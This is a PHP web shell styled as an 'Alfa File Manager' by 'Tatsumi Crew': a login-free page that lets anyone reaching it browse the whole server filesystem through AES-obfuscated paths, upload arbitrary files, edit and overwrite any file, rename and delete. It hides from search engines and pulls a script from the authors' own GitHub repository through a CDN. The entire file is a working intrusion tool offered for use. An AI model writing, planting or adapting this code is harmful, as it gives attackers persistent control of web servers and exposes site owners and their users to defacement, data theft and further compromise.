<?php
// ============================================================================
//  Author: Tatsumi Crew Team
//  Don't Delete Author !!!!!
// ============================================================================

define('AES_KEY', hex2bin('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'));

function aes_encrypt($plaintext)
{
    $iv     = openssl_random_pseudo_bytes(16);
    $cipher = openssl_encrypt($plaintext, 'AES-256-CBC', AES_KEY, OPENSSL_RAW_DATA, $iv);
    return base64_encode($iv . $cipher);
}

function aes_decrypt($ciphertext_base64)
{
    $data   = base64_decode($ciphertext_base64);
    $iv     = substr($data, 0, 16);
    $cipher = substr($data, 16);
    return openssl_decrypt($cipher, 'AES-256-CBC', AES_KEY, OPENSSL_RAW_DATA, $iv);
}

$base_dir = __DIR__;
$dir = $base_dir;

if (isset($_GET['dir'])) {
    $attempt = aes_decrypt($_GET['dir']);
    $real    = $attempt ? realpath($attempt) : false;
    $dir     = ($real !== false) ? $real : $base_dir;
}

if (isset($_GET['delete'])) {
    $target = realpath($dir . '/' . $_GET['delete']);
    if ($target && is_file($target)) {
        unlink($target);
    } elseif ($target && is_dir($target)) {
        array_map('unlink', glob("$target/*.*"));
        rmdir($target);
    }
    header("Location: ?dir=" . urlencode(aes_encrypt($dir)));
    exit;
}

if (isset($_POST['newfile'])) {
    file_put_contents($dir . '/' . basename($_POST['newfile']), '');
    header("Location: ?dir=" . urlencode(aes_encrypt($dir)));
    exit;
}

if (isset($_POST['newfolder'])) {
    mkdir($dir . '/' . basename($_POST['newfolder']));
    header("Location: ?dir=" . urlencode(aes_encrypt($dir)));
    exit;
}

if (isset($_POST['rename'], $_POST['to'])) {
    rename($dir . '/' . $_POST['rename'], $dir . '/' . $_POST['to']);
    header("Location: ?dir=" . urlencode(aes_encrypt($dir)));
    exit;
}

if (isset($_FILES['upload'])) {
    move_uploaded_file($_FILES['upload']['tmp_name'], $dir . '/' . $_FILES['upload']['name']);
    header("Location: ?dir=" . urlencode(aes_encrypt($dir)));
    exit;
}

if (isset($_POST['save'], $_POST['content'])) {
    file_put_contents($dir . '/' . $_POST['save'], $_POST['content']);
    header("Location: ?dir=" . urlencode(aes_encrypt($dir)));
    exit;
}

function human_filesize($bytes, $decimals = 2)
{
    $size   = ['B', 'KB', 'MB', 'GB', 'TB'];
    $factor = floor((strlen($bytes) - 1) / 3);
    return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . ' ' . $size[$factor];
}

function human_perms($file)
{
    if (!file_exists($file) || !is_readable($file)) return '---------';
    $perms = @fileperms($file);
    if ($perms === false) return '---------';

    $owner = (($perms & 0x0100) ? 'r' : '-') . (($perms & 0x0080) ? 'w' : '-') . (($perms & 0x0040) ? 'x' : '-');
    $group = (($perms & 0x0020) ? 'r' : '-') . (($perms & 0x0010) ? 'w' : '-') . (($perms & 0x0008) ? 'x' : '-');
    $other = (($perms & 0x0004) ? 'r' : '-') . (($perms & 0x0002) ? 'w' : '-') . (($perms & 0x0001) ? 'x' : '-');

    return $owner . $group . $other;
}

$entries = array_diff(scandir($dir), ['.', '..']);
$dirs    = [];
$files   = [];

foreach ($entries as $entry) {
    $path = $dir . DIRECTORY_SEPARATOR . $entry;
    if (is_dir($path)) {
        $dirs[] = $entry;
    } else {
        $files[] = $entry;
    }
}

sort($dirs, SORT_NATURAL | SORT_FLAG_CASE);
sort($files, SORT_NATURAL | SORT_FLAG_CASE);
$sortedItems = array_merge($dirs, $files);

$encDir = urlencode(aes_encrypt($dir));
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<title>🌟 Alfa - File Manager By Tatsumi Crew</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/gh/TatsumiOfficial/PemecahList/auto_style.css" rel="stylesheet">
<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
</style>
</head>
<body>
<div class="app-wrapper">
    <div class="header-card">
        <div class="d-flex flex-wrap justify-content-between align-items-center gap-3">
            <h1 class="header-title">
                <i class="fas fa-folder-open me-3"></i>Alfa File Manager
            </h1>
            <div class="d-flex gap-2 flex-wrap">
                <?php if ($dir !== $base_dir): ?>
                    <a href="?dir=<?= $encDir ?>" class="modern-btn">
                        <i class="fas fa-arrow-left"></i>
                        <span>Back</span>
                    </a>
                <?php endif; ?>
                <button class="modern-btn" data-bs-toggle="modal" data-bs-target="#uploadModal">
                    <i class="fas fa-upload"></i>
                    <span>Upload</span>
                </button>
                <button class="modern-btn" data-bs-toggle="modal" data-bs-target="#createFileModal">
                    <i class="fas fa-file-plus"></i>
                    <span>New File</span>
                </button>
                <button class="modern-btn" data-bs-toggle="modal" data-bs-target="#createFolderModal">
                    <i class="fas fa-folder-plus"></i>
                    <span>New Folder</span>
                </button>
            </div>
        </div>
    </div>

    <!-- Breadcrumb -->
    <div class="breadcrumb-modern">
        <nav aria-label="breadcrumb">
            <ol class="breadcrumb">
                <?php
                $parts = explode(DIRECTORY_SEPARATOR, trim($dir, DIRECTORY_SEPARATOR));
                $build = '';
                $keys = array_keys($parts);
                $lastKey = end($keys);

                foreach ($parts as $i => $p) {
                    $build .= DIRECTORY_SEPARATOR . $p;
                    $last = ($i === $lastKey);
                    echo '<li class="breadcrumb-item' . ($last ? ' active" aria-current="page"' : '"') . '>';
                    if (!$last) {
                        echo '<a href="?dir=' . urlencode(aes_encrypt($build)) . '">' . htmlspecialchars($p) . '</a>';
                    } else {
                        echo htmlspecialchars($p);
                    }
                    echo '</li>';
                }
                ?>
            </ol>
        </nav>
    </div>

    <!-- File Table -->
    <div class="file-table-card">
        <div class="table-responsive">
            <table class="table table-modern">
                <thead>
                    <tr>
                        <th>Name</th>
                        <th class="text-end">Size</th>
                        <th class="text-center">Permissions</th>
                        <th>Modified</th>
                        <th class="text-end">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($sortedItems as $item): ?>
                        <?php 
                        $path   = $dir . DIRECTORY_SEPARATOR . $item; 
                        $is_dir = is_dir($path); 
                        ?>
                        <tr>
                            <td>
                                <div class="d-flex align-items-center">
                                    <div class="file-icon <?= $is_dir ? 'folder' : 'file' ?>">
                                        <i class="fas fa-<?= $is_dir ? 'folder' : 'file-alt' ?>"></i>
                                    </div>
                                    <?php if ($is_dir): ?>
                                        <a href="?dir=<?= urlencode(aes_encrypt($path)) ?>" class="file-link">
                                            <?= htmlspecialchars($item) ?>
                                        </a>
                                    <?php else: ?>
                                        <a href="?dir=<?= $encDir ?>&edit=<?= urlencode(aes_encrypt($item)) ?>" class="file-link">
                                            <?= htmlspecialchars($item) ?>
                                        </a>
                                    <?php endif; ?>
                                </div>
                            </td>
                            <td class="text-end">
                                <?php
                                if ($is_dir) {
                                    echo '<span class="text-muted">—</span>';
                                } elseif (is_file($path) && is_readable($path)) {
                                    $fsize = @filesize($path);
                                    echo $fsize !== false ? human_filesize($fsize) : '<span class="text-muted">0 B</span>';
                                } else {
                                    echo '<span class="text-muted">0 B</span>';
                                }
                                ?>
                            </td>
                            <td class="text-center">
                                <span class="permission-badge">
                                    <?= (file_exists($path) && is_readable($path)) ? human_perms($path) : '---------' ?>
                                </span>
                            </td>
                            <td>
                                <?php
                                if (file_exists($path) && is_readable($path)) {
                                    $mtime = @filemtime($path);
                                    echo ($mtime !== false && $mtime > 0) ? date('M j, Y H:i', $mtime) : '<span class="text-muted">N/A</span>';
                                } else {
                                    echo '<span class="text-muted">N/A</span>';
                                }
                                ?>
                            </td>
                            <td class="text-end">
                                <div class="d-flex justify-content-end">
                                    <?php if (!$is_dir): ?>
                                        <a href="?dir=<?= $encDir ?>&edit=<?= urlencode(aes_encrypt($item)) ?>" class="action-btn edit" title="Edit">
                                            <i class="fas fa-edit"></i>
                                        </a>
                                    <?php endif; ?>
                                    <a href="?dir=<?= $encDir ?>&delete=<?= urlencode($item) ?>" class="action-btn delete" onclick="return confirm('Delete <?= addslashes($item) ?>?')" title="Delete">
                                        <i class="fas fa-trash"></i>
                                    </a>
                                    <button class="action-btn rename" data-bs-toggle="modal" data-bs-target="#renameModal" data-filename="<?= htmlspecialchars($item) ?>" title="Rename">
                                        <i class="fas fa-pen"></i>
                                    </button>
                                </div>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    </div>

    <!-- File Editor -->
    <?php if (isset($_GET['edit'])):
        $decryptedEdit = aes_decrypt($_GET['edit']);
        $ef            = $dir . '/' . $decryptedEdit;
        if (is_file($ef)):
            $cont = htmlspecialchars(file_get_contents($ef)); ?>
            <br>
            <div class="editor-card">
                <div class="editor-header">
                    <i class="fas fa-edit me-2"></i>Editing: <?= htmlspecialchars($decryptedEdit) ?>
                </div>
                <div class="p-3">
                    <form method="POST">
                        <textarea class="form-control editor-textarea" name="content" rows="20" placeholder="Start typing your code here..."><?= $cont ?></textarea>
                        <input type="hidden" name="save" value="<?= htmlspecialchars($decryptedEdit) ?>">
                        <div class="text-end mt-3">
                            <button type="submit" class="btn btn-modern-primary">
                                <i class="fas fa-save me-2"></i>Save Changes
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        <?php endif; endif; ?>
    </div>

    <div class="modal fade modal-modern" id="uploadModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-upload me-2"></i>Upload File
                    </h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form method="POST" enctype="multipart/form-data">
                    <div class="modal-body">
                        <div class="mb-3">
                            <label class="form-label text-white-50">Select file to upload</label>
                            <input type="file" name="upload" class="form-control" required>
                        </div>
                    </div>
                    <div class="modal-footer border-0">
                        <button type="button" class="btn btn-modern-secondary" data-bs-dismiss="modal">Cancel</button>
                        <button type="submit" class="btn btn-modern-primary">
                            <i class="fas fa-upload me-2"></i>Upload
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <div class="modal fade modal-modern" id="createFileModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-file-plus me-2"></i>Create New File
                    </h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form method="POST">
                    <div class="modal-body">
                        <div class="mb-3">
                            <label class="form-label text-white-50">File name</label>
                            <input type="text" class="form-control" name="newfile" placeholder="Enter file name..." required>
                        </div>
                    </div>
                    <div class="modal-footer border-0">
                        <button type="button" class="btn btn-modern-secondary" data-bs-dismiss="modal">Cancel</button>
                        <button type="submit" class="btn btn-modern-primary">
                            <i class="fas fa-plus me-2"></i>Create
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <div class="modal fade modal-modern" id="createFolderModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-folder-plus me-2"></i>Create New Folder
                    </h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form method="POST">
                    <div class="modal-body">
                        <div class="mb-3">
                            <label class="form-label text-white-50">Folder name</label>
                            <input type="text" class="form-control" name="newfolder" placeholder="Enter folder name..." required>
                        </div>
                    </div>
                    <div class="modal-footer border-0">
                        <button type="button" class="btn btn-modern-secondary" data-bs-dismiss="modal">Cancel</button>
                        <button type="submit" class="btn btn-modern-primary">
                            <i class="fas fa-folder-plus me-2"></i>Create
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <div class="modal fade modal-modern" id="renameModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-pen me-2"></i>Rename Item
                    </h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form method="POST">
                    <div class="modal-body">
                        <div class="mb-3">
                            <label class="form-label text-white-50">New name</label>
                            <input type="hidden" name="rename" id="renameOriginal">
                            <input type="text" class="form-control" name="to" placeholder="Enter new name..." required>
                        </div>
                    </div>
                    <div class="modal-footer border-0">
                        <button type="button" class="btn btn-modern-secondary" data-bs-dismiss="modal">Cancel</button>
                        <button type="submit" class="btn btn-modern-primary">
                            <i class="fas fa-check me-2"></i>Rename
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <div class="footer-modern">
        <p class="mb-0">
            <i class="fas fa-heart text-danger me-2"></i>
            &copy; <?= date('Y') ?> Alfa File Manager by Tatsumi Crew. All rights reserved.
        </p>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/TatsumiOfficial/PemecahList/scripts.js"></script>
</body>
</html>